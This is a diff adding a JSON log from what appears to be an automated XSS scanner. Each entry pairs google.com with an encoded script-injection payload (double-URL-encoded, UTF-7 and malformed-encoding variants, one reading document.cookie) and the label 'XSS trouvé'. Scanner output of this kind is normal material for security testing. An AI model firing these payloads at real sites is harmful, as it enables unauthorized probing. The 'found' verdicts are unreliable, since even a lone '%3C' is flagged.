@@ -1,0 +1,62 @@
+[
+    {
+        "url": "https://google.com/",
+        "payload": "%253cscript%253ealert(1)%253c/script%253e",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:18:57"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "%3C",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:19:19"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:19:41"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:19:41"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:19:41"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:19:41"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "%253cscript%253ealert(document.cookie)%253c/script%253e",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:19:42"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "%BCscript%BEalert(%A2XSS%A2)%BC/script%BE",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:22:38"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "%BCscript%BEalert(%A2XSS%A2)%BC/script%BE",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:23:12"
+    },
+    {
+        "url": "https://google.com/",
+        "payload": "%253cscript%253ealert(1)%253c/script%253e",
+        "description": "XSS trouvé",
+        "time": "2025-01-09 13:23:48"
+    }
+]
